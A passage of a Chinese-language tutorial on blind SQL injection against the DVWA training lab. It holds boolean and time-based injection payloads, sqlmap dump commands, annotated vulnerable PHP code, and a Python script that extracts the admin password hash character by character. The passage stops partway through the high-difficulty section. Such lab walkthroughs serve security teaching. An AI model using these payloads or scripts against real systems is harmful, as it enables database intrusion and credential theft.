class="operator">=</span><span class="string">&#x27;g&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 继续...得到：guestbook</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤4：枚举表的列名"><a href="#步骤4：枚举表的列名" class="headerlink" title="步骤4：枚举表的列名"></a>步骤4：枚举表的列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- users表的列数</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27; AND table_schema=database())&gt;5 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第一个列名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 继续...得到：user_id, first_name, last_name, user, password, avatar...</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤5：提取数据"><a href="#步骤5：提取数据" class="headerlink" title="步骤5：提取数据"></a>步骤5：提取数据</h4><p><strong>获取admin密码（逐字符）：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 密码长度</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH((SELECT password FROM users WHERE user=&#x27;</span>admin<span class="string">&#x27;))=32 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第一个字符</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 第二个字符</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING((SELECT password FROM users WHERE user=&#x27;</span>admin<span class="string">&#x27;),2,1)=&#x27;</span>f<span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 继续...得到完整MD5哈希</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤6：时间盲注（当布尔盲注不可用时）"><a href="#步骤6：时间盲注（当布尔盲注不可用时）" class="headerlink" title="步骤6：时间盲注（当布尔盲注不可用时）"></a>步骤6：时间盲注（当布尔盲注不可用时）</h4><p><strong>测试时间盲注：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --</span></span><br><span class="line"><span class="string">结果：响应延迟5秒</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 条件时间盲注</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--  → 延迟5秒（True）</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF(1=2, SLEEP(5), 0) --  → 立即响应（False）</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用时间盲注提取数据：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库名第一个字符是&#x27;d&#x27;</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF(SUBSTRING(database(),1,1)=&#x27;</span>d<span class="string">&#x27;, SLEEP(5), 0) --</span></span><br><span class="line"><span class="string">响应慢 → True</span></span><br><span class="line"><span class="string">响应快 → False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 提取密码</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤7：使用SQLMap自动化"><a href="#步骤7：使用SQLMap自动化" class="headerlink" title="步骤7：使用SQLMap自动化"></a>步骤7：使用SQLMap自动化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本扫描</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --batch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       -D dvwa --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取列名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       -D dvwa -T <span class="built_in">users</span> --columns</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       -D dvwa -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用了mysqli和简单过滤，但仍可进行盲注。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：从POST获取数据（而不是GET） ★★★</span></span><br><span class="line">    <span class="comment">// POST数据不会显示在URL中</span></span><br><span class="line">    <span class="comment">// 但这不能防止SQL注入！</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：使用mysqli（而不是mysql） ★★★</span></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string() - 转义特殊字符</span></span><br><span class="line">    <span class="comment">// 参数1：数据库连接</span></span><br><span class="line">    <span class="comment">// 参数2：要转义的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 转义内容：</span></span><br><span class="line">    <span class="comment">// \x00 → \\x00</span></span><br><span class="line">    <span class="comment">// \n   → \\n</span></span><br><span class="line">    <span class="comment">// \r   → \\r</span></span><br><span class="line">    <span class="comment">// \    → \\</span></span><br><span class="line">    <span class="comment">// &#x27;    → \&#x27;</span></span><br><span class="line">    <span class="comment">// &quot;    → \&quot;</span></span><br><span class="line">    <span class="comment">// \x1a → \\x1a</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 仍然是字符串拼接，不是参数化查询</span></span><br><span class="line">    <span class="comment">// 2. 在某些情况下仍可能被绕过（如宽字节注入）</span></span><br><span class="line">    <span class="comment">// 3. 不防止数字型注入（如果没有引号）</span></span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ?</span><br><span class="line">           <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> ) :</span><br><span class="line">           ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 仍然拼接SQL ★★★</span></span><br><span class="line">    <span class="comment">// 虽然使用了mysqli_real_escape_string()，但仍不安全</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进3：不显示错误信息 ★★★</span></span><br><span class="line">    <span class="comment">// 移除了 or die(mysql_error())</span></span><br><span class="line">    <span class="comment">// 攻击者无法看到SQL错误</span></span><br><span class="line">    <span class="comment">// 但这使得需要使用盲注技术</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仍然只显示存在/不存在</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// 用户存在</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 改进4：不透露具体原因 ★★★</span></span><br><span class="line">        <span class="comment">// 无论是不存在还是查询错误，都显示相同信息</span></span><br><span class="line">        <span class="comment">// 增加了攻击难度</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HTML表单改为POST：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        User ID:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">size</span>=<span class="string">&quot;15&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>使用POST</strong> - 数据不在URL中</li>
+<li><strong>mysqli_real_escape_string()</strong> - 转义特殊字符</li>
+<li><strong>不显示错误</strong> - 移除die(mysql_error())</li>
+<li><strong>统一错误信息</strong> - 不透露失败原因</li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>关键问题：</strong></p>
+<p>虽然使用了<code>mysqli_real_escape_string()</code>，但：</p>
+<ol>
+<li><p><strong>数字型注入</strong> - 查询中<code>user_id = $id</code>没有引号！</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注意：没有引号包围$id</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> $id;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>mysqli_real_escape_string()只转义引号</strong> - 对数字型注入无效</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1</span><br><span class="line">mysqli_real_escape_string(): 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1 (不变)</span><br><span class="line">SQL: SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE user_id = 1 <span class="keyword">OR</span> <span class="attribute">1</span>=1;</span><br><span class="line">结果：注入成功！</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：数字型注入（最直接）"><a href="#方法1：数字型注入（最直接）" class="headerlink" title="方法1：数字型注入（最直接）"></a>方法1：数字型注入（最直接）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>    → <span class="keyword">User</span> <span class="keyword">exists</span>（返回所有用户）</span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   → <span class="keyword">User</span> <span class="keyword">not</span> found（<span class="literal">False</span>）</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 布尔盲注</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> LENGTH(database())<span class="operator">=</span><span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：时间盲注"><a href="#方法2：时间盲注" class="headerlink" title="方法2：时间盲注"></a>方法2：时间盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> SLEEP(<span class="number">5</span>)</span><br><span class="line">→ 响应延迟<span class="number">5</span>秒</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 条件时间盲注</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">AND</span> IF((<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;d&#x27;</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：使用SQLMap"><a href="#方法3：使用SQLMap" class="headerlink" title="方法3：使用SQLMap"></a>方法3：使用SQLMap</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定POST参数</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span> \</span><br><span class="line">       --data=<span class="string">&quot;id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=medium; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --batch \</span><br><span class="line">       -p <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用时间盲注技术</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span> \</span><br><span class="line">       --data=<span class="string">&quot;id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=medium; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --technique=T \</span><br><span class="line">       -D dvwa -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：Python脚本自动化"><a href="#方法4：Python脚本自动化" class="headerlink" title="方法4：Python脚本自动化"></a>方法4：Python脚本自动化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_condition</span>(<span class="params">condition</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试条件是否为True&quot;&quot;&quot;</span></span><br><span class="line">    payload = <span class="string">f&quot;1 AND <span class="subst">&#123;condition&#125;</span>&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>: payload, <span class="string">&#x27;Submit&#x27;</span>: <span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_string</span>(<span class="params">query, length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;提取字符串（布尔盲注）&quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 二分法查找字符</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>:</span><br><span class="line">            condition = <span class="string">f&quot;(SELECT SUBSTRING((<span class="subst">&#123;query&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=&#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_condition(condition):</span><br><span class="line">                result += c</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found char <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;c&#125;</span> (current: <span class="subst">&#123;result&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> check_condition(<span class="string">f&quot;LENGTH(database())=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Database name length: <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取数据库名</span></span><br><span class="line">db_name = extract_string(<span class="string">&quot;database()&quot;</span>, length)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Database name: <span class="subst">&#123;db_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取admin密码</span></span><br><span class="line">password = extract_string(<span class="string">&quot;SELECT password FROM users WHERE user=&#x27;admin&#x27;&quot;</span>, <span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Admin password hash: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用了LIMIT和Session，增加了复杂度，但仍可盲注。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：使用Cookie传递数据 ★★★</span></span><br><span class="line">    <span class="comment">// 而不是GET或POST</span></span><br><span class="line">    <span class="comment">// 但这不能防止SQL注入！</span></span><br><span class="line">    <span class="comment">// 攻击者仍可以修改Cookie</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：使用Session限制尝试次数 ★★★</span></span><br><span class="line">    <span class="comment">// 检查Session中是否有尝试次数记录</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>] ) ) &#123;</span><br><span 